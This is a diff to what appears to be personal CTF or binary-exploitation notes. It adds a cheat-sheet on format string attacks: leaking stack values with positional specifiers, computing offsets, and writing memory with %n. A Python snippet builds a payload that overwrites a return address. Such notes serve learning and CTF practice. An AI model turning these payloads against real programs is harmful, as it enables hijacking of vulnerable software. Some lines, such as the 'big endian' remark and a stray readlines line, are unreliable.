@@ -93,7 +93,47 @@ Use pwnlib to do syscalls:
 - %08x prints 4 bytes of the stack in big endian format
 - %016lx prints 8 bytes of the stack in big endian format
 - adding n$ between the % and the format allows to offset by n
- 
+- First 6 args are pushed in registers
+  - arg 0 = format
+  - arg 1-5 = registers
+  - arg 6+ = stack
+- Leak top of stack = `%6$x`
+  - `%7$x, %8$x` for next value on stack etc...
+- Leak specific address:
+  - decimal(desired_addr - top_of_stack_addr)/8 + 6 = n
+  - `%n$lx` to leak address
+- Write data:
+  - `"A%9$nAAA\0\0\0\0\0\x40\x40\x12" -> A %9$n AAA 0x0000000000404012`
+    - Length of input before %n is what is going to be written
+    - %9$n means that we are going to write in the pointer located at the 9th arguments position
+      - AKA 4th arg on the stack or rsp+0x18
+    - AAA is padding to reach the 9th argument
+    - 0x0000000000404012 is the address of the pointer we want to write to
+      - it is going to be stored at rsp+0x18/4th arg on the stack/%9$
+    - Result: We write 1 to the address 0x0000000000404012
+    - dynamically find a pointer to write to:
+    res = readlines(15).split("\n")
+```python
+    #Leak a random pointer on the stack, that points to another location on the stack
+    sendline("%372$x")
+    #Contains the data we leaked.
+    #In this case, a random pointer that pointed to somewhere on the stack
+    res = readline()
+    #Difference between the address we leaked to and the location of the return address on the stack
+    offset = 3368
+    stack = int(res, 16)
+    #Pointer that contains the return address
+    return_addr = stack + offset
+
+    #%4200224x %10$n 12 + return_addr
+    #%4200224x -> the data we want to write. In this case, the new return address that we want
+    #4200224 -> 0x401720 in decimal
+    #%4200224x means we add 0x401720 bytes of padding, therefore we write 0x401720 bytes
+    #%10$n means that our pointer is located at argument 10, or the 4th arg on the stack
+    #12 is just padding to reach the 4th arg position on the stack
+    #return address is writen to that position
+    fmtstr_payload = b"%4200224x%10$n12"+packing.p64(return_addr)
+```
 
 ### Endianness:
 
